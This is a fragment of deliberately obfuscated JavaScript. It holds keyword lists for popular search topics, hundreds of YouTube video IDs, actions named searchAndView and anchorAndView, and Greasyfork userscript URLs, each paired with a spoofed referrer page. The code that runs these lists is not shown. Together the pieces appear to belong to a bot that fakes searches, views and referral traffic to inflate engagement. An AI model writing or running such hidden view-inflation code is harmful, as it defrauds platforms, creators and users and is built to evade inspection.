searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1a38 + -0x75e + 0x21a0 * 0x1)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0xa0 * 0x35 + -0x25f9 + -0x1 * -0x4723)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + a0(0x1c) + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x22f8 * 0x1 + 0x37 * -0x5d + 0xefa * -0x1);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    a1(0x3, 'rtp&') + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    a1(0x19, '$Adq') + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    a0(0x1a) + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    a1(0x16, '%Dq2') + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    a1(0xa, 'rtp&') + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + a1(0x5, 'TFOz') + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a2(0x1d) + 'e/mope.io'
    },
